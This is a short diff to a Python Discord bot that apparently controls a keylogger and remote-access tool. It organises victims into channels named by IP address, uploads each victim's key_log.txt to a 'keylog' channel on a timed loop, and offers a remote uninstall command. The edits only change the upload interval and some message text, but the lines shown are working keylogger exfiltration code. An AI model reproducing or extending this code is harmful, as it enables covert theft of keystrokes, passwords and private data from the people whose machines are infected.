@@ -427,13 +427,13 @@ async def on_ready():
                     if channel:
                         await channel.send(embed=embed)
 
-    @tasks.loop(seconds=10)
+    @tasks.loop(seconds=30)
     async def update_keylog():
         category = nextcord.utils.get(guild.categories, name=str(ip))
         channel = nextcord.utils.get(category.text_channels, name="keylog")
 
         await channel.purge()
-        
+
         await channel.send(file=nextcord.File(os.path.join(target_path, "skibidi-main", "key_log.txt")))
 
     @tasks.loop(seconds=60)
@@ -620,8 +620,8 @@ async def uninstall(interaction : Interaction):
         print("Uninstall command received")
         user_id = interaction.user.id
         print("Uninstalling...")
-        await interaction.response.send_message("Uninstalling this program all clients...")
-        await interaction.edit_original_message(content="This program has been uninstalled from all clients!")
+        await interaction.response.send_message("Uninstalling this program from this client...")
+        await interaction.edit_original_message(content="This program has been uninstalled from this client!")
         global process
         script_content = """
 import shutil
